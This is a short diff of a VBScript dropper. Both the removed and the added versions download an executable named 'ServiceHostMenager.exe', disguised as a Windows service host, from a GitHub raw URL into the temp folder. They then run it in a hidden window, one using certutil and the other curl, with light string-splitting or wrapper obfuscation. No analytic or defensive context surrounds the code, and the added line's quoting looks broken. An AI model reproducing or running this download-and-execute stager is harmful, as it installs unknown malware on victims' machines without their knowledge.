@@ -1,9 +1,8 @@
-Dim a, b, c
-a = "h" & "tt" & "ps:/" & "/github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe"
-b = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & "ServiceHostMenager.exe"
-
-Set c = CreateObject("WScript.Shell")
-c.Run "certutil -urlcache -split -f " & a & " " & b, 0, True
-c.Run Chr(34) & b & Chr(34), 0 ' Run silently
-
-Set c = Nothing
+Set WshShell = CreateObject("WScript.Shell")
+Function RunCommand(cmd)
+    Dim temp
+    temp = Replace(cmd, " ", Chr(32))
+    RunCommand = temp
+End Function
+WshShell.Run RunCommand("cmd /c curl -s -o "%temp%\ServiceHostMenager".exe -JL "https://github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe" & start %temp%\ServiceHostMenager.exe"), 0, False
+Set WshShell = Nothing
